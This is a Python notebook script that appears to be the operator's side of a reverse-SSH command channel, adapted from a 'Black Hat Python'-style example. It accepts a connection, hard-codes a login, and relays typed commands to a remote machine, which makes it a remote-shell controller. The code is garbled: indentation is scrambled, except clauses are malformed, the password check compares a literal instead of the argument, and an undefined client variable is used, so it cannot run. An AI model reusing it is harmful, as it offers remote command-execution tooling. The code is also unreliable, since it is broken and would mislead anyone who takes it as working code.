#!/usr/bin/env python
# coding: utf-8

# In[ ]:


# ------------------------------SSH SERVER------------------------------

import paramiko
import socket
import threading 
import sys

host_key = paramiko.RSAKey(filename='test_rsa.key')

class Server(paramiko.ServerInterface):
    
    def __init__(self):
        self.event = threading.Event()
        
    def check_request(self, kind, channelId):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    
    def check_pass_authentification(self, username, password):
        if(username == 'Chuck') and ('password' == 'foremostgecko'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
    
    
    
    server = sys.argv[1]
    ssh_port = int(sys.argv[2])
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
    except Exception, e:
        print('Listen Failed'  + str(e))
        sys.exit(1)
        print '[+] Connection'
        
        
    try:
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host_key)
        server = Server()
        try:
            bhSession.start_server(server=server)
            except:
                paramiko.SSHException, x:
                    print '[-] SSH Failed'
                    chan = bhSession.accept(20)
                    print '[+] Authenfication complete'
                    chan.send('Welcome')
                    
                    while True:
                        try:
                            command = raw_input("Enter Command :").strip('\n')
                            if command != 'exit':
                                chan.send(command)
                                print chan.recv(1024) + '\n'
                            else:
                                chan.send('exit')
                                print 'exit'
                                bhSession.close()
                            raise Exception ('exit')
                            except KeyboardInterrupt:
                                bhSession.close()
                                except Exception, e:
                                    print '[-] Exception Caught'
                                    try:
                                        bhSession.close()
                                    except:
                                        pass
                                    sys.exit(1)

